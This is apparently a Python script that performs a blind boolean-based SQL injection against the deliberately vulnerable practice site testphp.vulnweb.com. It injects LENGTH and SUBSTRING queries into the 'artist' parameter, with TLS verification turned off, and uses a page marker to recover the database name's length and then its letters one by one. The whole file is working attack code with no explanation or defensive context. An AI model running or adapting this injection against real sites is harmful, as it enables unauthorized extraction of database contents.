import requests
from pprint import pprint
__author__ = 'jfc_me'

n = 0
url = 'http://testphp.vulnweb.com/artists.php?artist=1'
querys = [' AND (SELECT LENGTH(database()))= ',
          ' AND (SELECT SUBSTRING(database(), ']

for a in range(1, 10000):
    tamanho = querys[0] + str(a)
    print(url + tamanho)
    if 'r4w8173' in requests.get(url + tamanho,  verify=False, timeout=10).text:
        length = a
        break

print("."*100)
literais = 'abcdefghijklmnopqrstuvwxyz'
database = ''
while n < length:
    n = n + 1

    for c in literais:
        nomeBanco = querys[1] + str(n) + ", 1))='" + c
        end = url + nomeBanco
        pprint(end)
        if 'r4w8173' in requests.get(end,  verify=False, timeout=10).text:
            database += c

            break

apresentacao = """
tamanho  :  ................................  {}
banco  :  ..................................  {}
url  :  ....................................  {}
""".format(length, database, url)
print(apresentacao)
